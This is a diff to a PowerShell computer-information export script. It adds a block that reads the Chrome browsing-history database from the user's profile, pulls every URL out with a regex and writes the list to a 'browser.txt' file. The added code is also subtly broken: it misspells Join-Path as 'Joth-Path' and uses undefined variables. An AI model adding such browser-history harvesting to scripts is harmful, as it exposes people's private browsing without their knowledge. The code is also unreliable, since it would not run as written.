@@ -58,3 +58,30 @@ $output = $computerInfo | Format-Table -AutoSize | Out-String
 $output | Out-File -FilePath $outputFilePath
 
 Write-Host "Computer information exported to $outputFilePath"
+
+##############################################
+
+#extract browser history
+$Path = Join-Path $env:USERPROFILE "AppData\Local\Google\Chrome\User Data\Default\History" 
+if (-not (Test-Path -Path $Path)) { 
+    Write-Verbose "[!] Could not find Chrome History for username: $UserName" 
+} 
+$Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' 
+$Value = Get-Content -Path $Path |Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique 
+$OutputData = $Value | ForEach-Object { 
+    $Key = $_ 
+    if ($Key -match $Search){ 
+        New-Object -TypeName PSObject -Property @{ 
+            User = $UserName 
+            Browser = 'Chrome' 
+            DataType = 'History' 
+            Data = $_ 
+        } 
+    } 
+}
+
+# Specify the output file path
+$outputFilePath = Joth-Path $folderPath "browser.txt"
+
+$OutputData | Out-File -FilePath $outputFilePath
+
